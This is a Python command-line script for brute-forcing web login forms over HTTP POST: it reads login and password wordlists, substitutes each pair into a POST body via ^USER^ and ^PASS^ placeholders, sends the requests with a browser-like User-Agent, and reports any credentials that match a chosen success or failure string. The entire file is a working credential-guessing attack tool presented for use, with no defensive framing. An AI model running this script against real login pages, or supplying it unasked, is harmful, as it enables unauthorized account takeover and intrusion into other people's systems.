import requests
import argparse
import random
import string

CONF = { 
    'headers': {},
    'cookies': '',
    'data': '',
    'success': None,
    'failure': None
}

#Default headers
CONF['headers']['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"
CONF['headers']['Content-Type'] = "application/x-www-form-urlencoded"


#From a request returned content, check the presence of success/failure message
def checkMsg(text):
    if CONF['success'] is not None and CONF['success'] in text:
        return True            
    if CONF['failure'] is not None and CONF['failure'] not in text:
        return True
    return False


def check(url, data):
    result = requests.post(url, data=data, headers=CONF['headers'], cookies=CONF['cookies'])
    return result.status_code, checkMsg(result.text)


def query(url, data):
    
    result = requests.post(url, data=data, headers=CONF['headers'], cookies=CONF['cookies'])
    #print(result.status_code, result.text)

    if result.status_code >= 200 and result.status_code < 400:
        return checkMsg(result.text)

    else:
        print('[-]', result.status_code)
        return False


def fileReader(filename):
    with open(filename,'r') as file:
        while True:
            x = file.readline()
            if x:
                yield x.strip()
            else:
                yield False

print()
parser = argparse.ArgumentParser(description='HTTP POST bruteforcer')
parser.add_argument('-u', '--url', metavar='URL', required=True, help='URL to bruteforce')
parser.add_argument('-L', '--logins', metavar='LOGIN WORDLIST', required=True, help='Login file')
parser.add_argument('-P', '--passwords', metavar='PASSWORD WORDLIST', required=True, help='Passwords file')
parser.add_argument('-x', '--headers', metavar='HEADER', action='append', help='Additionnal headers, format HEADER:VALUE')
parser.add_argument('-c', '--cookies', metavar='COOKIES', help='Cookies. Standard format : var1=val1;var2=val2')
parser.add_argument('-d', '--data', metavar='DATA', required=True, help='POST body to send. Standard format : var1=val1&var2=val2 Use ^USER^ and ^PASS^ as placeholders')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-s', '--success', metavar='MSG SUCCESS', help='Success string to look for')
group.add_argument('-f', '--failure', metavar='MSG FAILURE', help='Failure string to look for')
#args = parser.parse_args()
args, leftovers = parser.parse_known_args()

CONF['success'] = args.success
CONF['failure'] = args.failure

for h in args.headers:
    idx = h.find(':')
    if idx > -1:
        CONF['headers'][h[0:idx].strip()] = h[idx+1:].strip()

print("[+] URL :", args.url)

#check URL with random data
#
login = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
password = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
datatmp = args.data.replace("^USER^", login).replace("^PASS^", password)
res_code, res_check = check(args.url, datatmp)

if res_code != 200:
    print('[!] Beware URL is returning status code', res_code)

if res_check:
    print('[!] Beware URL is validating your success/failure condition with random credentials')


#Start actual bruteforce
#
loginIterator = fileReader(args.logins)

password = None
while True:

    if not password:
        login = next(loginIterator)

        if not login:
            break

        passwordIterator = fileReader(args.passwords)
        password = next(passwordIterator)

    datatmp = args.data.replace("^USER^", login).replace("^PASS^", password)
    CONF['headers']['Content-Length'] = str(len(datatmp))

    if query(args.url, datatmp):
        print("[+] Found valid credentials :", login, "/", password)
        found = True

    password = next(passwordIterator)

print("[+] Done")
